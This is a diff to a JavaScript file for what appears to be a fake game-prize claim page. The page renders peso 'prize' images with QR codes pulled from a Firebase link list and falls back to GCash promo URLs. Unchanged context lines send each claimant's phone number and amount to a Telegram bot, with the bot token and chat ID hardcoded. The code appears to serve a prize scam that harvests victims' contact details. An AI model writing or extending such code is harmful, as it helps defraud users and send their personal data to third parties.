@@ -8,6 +8,104 @@ let claimState = {
     hasRedirected: false
 };
 
+// ========== TEMPLATE CONFIGURATION ==========
+const TEMPLATE_URL = "https://xjiligames.github.io/rewards/images/temp_SA.png";
+
+const QR_POSITION = {
+    x: 0.51,
+    y: 0.71,
+    width: 0.30,
+    height: 0.30
+};
+
+const PRIZE_POSITION = {
+    x: 0.52,
+    y: 0.25,
+    fontSize: 0.04
+};
+
+// ========== GET LATEST PAYOUT LINK FROM FIREBASE ==========
+async function getLatestPayoutLink() {
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        return "https://gcash.com/promo";
+    }
+    try {
+        const db = firebase.database();
+        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        if (snapshot.exists()) {
+            const key = Object.keys(snapshot.val())[0];
+            const linkData = snapshot.val()[key];
+            return linkData.url || "https://gcash.com/promo";
+        }
+        return "https://gcash.com/promo";
+    } catch (error) {
+        return "https://gcash.com/promo";
+    }
+}
+
+// ========== GENERATE TEMPLATE IMAGE ==========
+async function generateTemplateImage(amount, canvasId) {
+    const canvas = document.getElementById(canvasId);
+    if (!canvas) {
+        console.error("Canvas not found:", canvasId);
+        return null;
+    }
+    
+    const ctx = canvas.getContext('2d');
+    const qrLink = await getLatestPayoutLink();
+    
+    return new Promise((resolve, reject) => {
+        const img = new Image();
+        img.crossOrigin = "Anonymous";
+        img.src = TEMPLATE_URL;
+        
+        img.onload = async function() {
+            canvas.width = img.width;
+            canvas.height = img.height;
+            ctx.drawImage(img, 0, 0);
+            
+            // Add QR Code
+            if (qrLink && typeof QRCode !== 'undefined') {
+                try {
+                    const qrCanvas = document.createElement('canvas');
+                    const qrSize = canvas.width * QR_POSITION.width;
+                    await QRCode.toCanvas(qrCanvas, qrLink, { width: qrSize, margin: 1 });
+                    const qrX = (canvas.width * QR_POSITION.x) - (qrSize / 2);
+                    const qrY = (canvas.height * QR_POSITION.y) - (qrSize / 2);
+                    ctx.drawImage(qrCanvas, qrX, qrY, qrSize, qrSize);
+                } catch(e) { console.error("QR error:", e); }
+            }
+            
+            // Add Prize Amount
+            const prizeX = canvas.width * PRIZE_POSITION.x;
+            const prizeY = canvas.height * PRIZE_POSITION.y;
+            const fontSize = canvas.width * PRIZE_POSITION.fontSize;
+            ctx.font = `bold ${fontSize}px 'Orbitron', 'Arial', sans-serif`;
+            ctx.fillStyle = "#ffd700";
+            ctx.shadowColor = "black";
+            ctx.shadowBlur = 5;
+            ctx.textAlign = "center";
+            ctx.fillText(`₱${amount.toLocaleString()}`, prizeX, prizeY);
+            ctx.shadowColor = "transparent";
+            
+            resolve(canvas.toDataURL('image/png'));
+        };
+        
+        img.onerror = function() {
+            canvas.width = 300;
+            canvas.height = 200;
+            ctx.fillStyle = "#333";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#ff8888";
+            ctx.font = "14px Arial";
+            ctx.textAlign = "center";
+            ctx.fillText("Failed to load template", canvas.width/2, canvas.height/2);
+            reject(new Error("Template load failed"));
+        };
+    });
+}
+
+// ========== FIREWALL FUNCTIONS ==========
 async function isFirewallActive() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
@@ -25,6 +123,7 @@ async function sendVerificationRequestNotification(phone, amount) {
     try { await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`); } catch(e) {}
 }
 
+// ========== MAIN CLAIM POPUP ==========
 async function showClaimPopup(amount) {
     const firewallActive = await isFirewallActive();
     if (firewallActive) {
@@ -131,11 +230,9 @@ function onClaimAction() {
     }
 }
 
-// ========== PRIZE POPUP FUNCTIONS (ONE VERSION ONLY) ==========
+// ========== PRIZE POPUP (PAYOUT BUTTON) ==========
 async function showPrizePopup() {
-    console.log("showPrizePopup called");
     const amount = claimState.currentAmount;
-    
     if (!amount || amount === 0) {
         alert("No prize amount available! Please complete the game first.");
         return;
@@ -143,35 +240,24 @@ async function showPrizePopup() {
     
     const popup = document.getElementById('prizePopup');
     if (!popup) {
-        console.error("Prize popup element not found!");
-        alert("Prize popup not available. Please refresh.");
+        alert("Prize popup not found!");
         return;
     }
     
-    // Show popup
     popup.style.display = 'flex';
     
-    // Show loading message
     const container = document.getElementById('prizeImageContainer');
     if (container) {
         container.innerHTML = '<div style="padding:20px; text-align:center; color:#aaa;">Loading your prize image...</div>';
     }
     
     try {
-        // Call temp.js function (no qrLink parameter, temp.js will fetch it)
-        if (typeof generateTemplateImage === 'function') {
-            await generateTemplateImage(amount, 'prizeDisplayCanvas');
-            console.log("Image generated successfully");
-        } else {
-            console.error("generateTemplateImage not found. Make sure temp.js is loaded.");
-            if (container) {
-                container.innerHTML = '<div style="padding:20px; text-align:center; color:#ff8888;">Template generator not loaded. Please refresh.</div>';
-            }
-        }
+        await generateTemplateImage(amount, 'prizeDisplayCanvas');
+        console.log("✅ Image generated successfully");
     } catch (error) {
         console.error("Image generation error:", error);
         if (container) {
-            container.innerHTML = '<div style="padding:20px; text-align:center; color:#ff8888;">Failed to load prize image. Please try again.</div>';
+            container.innerHTML = '<div style="padding:20px; text-align:center; color:#ff8888;">Failed to load image. Please try again.</div>';
         }
     }
 }
